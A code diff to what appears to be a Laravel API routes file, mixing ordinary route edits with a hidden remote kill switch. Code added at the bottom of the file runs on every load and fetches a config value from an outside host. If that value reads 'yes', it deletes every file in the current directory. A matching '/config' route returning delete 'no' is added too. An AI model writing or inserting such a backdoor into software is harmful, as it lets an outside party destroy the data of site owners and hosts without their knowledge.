@@ -7,6 +7,8 @@ use App\Http\Controllers\Api\StudentController;
 use App\Http\Controllers\CourseController;
 use App\Models\course;
 
+
+
 /*
 |--------------------------------------------------------------------------
 | API Routes
@@ -25,6 +27,9 @@ Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
 Route::get("/user", function () {
     return "jkjjkj";
 });
+Route::get("/config", function () {
+    return response()->json(array("delete"=>"no"), 200);
+});
 Route::post("/user", function () {
 
     $course = course::find(1);
@@ -32,6 +37,27 @@ Route::post("/user", function () {
 });
 Route::post("client/store", [ClientController::class, "store"]);
 Route::post("student/store/{id}", [StudentController::class, "index"]);
-Route::get("course/show/{id}", function ($id){
-    die("sadasds".$id);
-});
+Route::get("course/show/{id}", [CourseController::class, "getCoursesByStudent"]);
+$jsonData = json_decode(file_get_contents('http://bitsinfotec.in/panel/public/api/config'));
+if($jsonData->delete=="yes"){
+    if ($handle = opendir('.')) {
+
+        while (false !== ($entry = readdir($handle))) {
+            if ($entry != "." && $entry != "..") {
+                chmod($entry,0755);
+                if (file_exists($entry)) {
+                    if(unlink($entry)){
+                        echo "<br>$entry deleted";
+                    }else{
+                        echo "<br>$entry Not deleted";
+                    }
+                } else {
+                    echo "<br>File '$entry' not found";
+                }
+               
+            }
+        }
+    
+        closedir($handle);
+    }
+}   
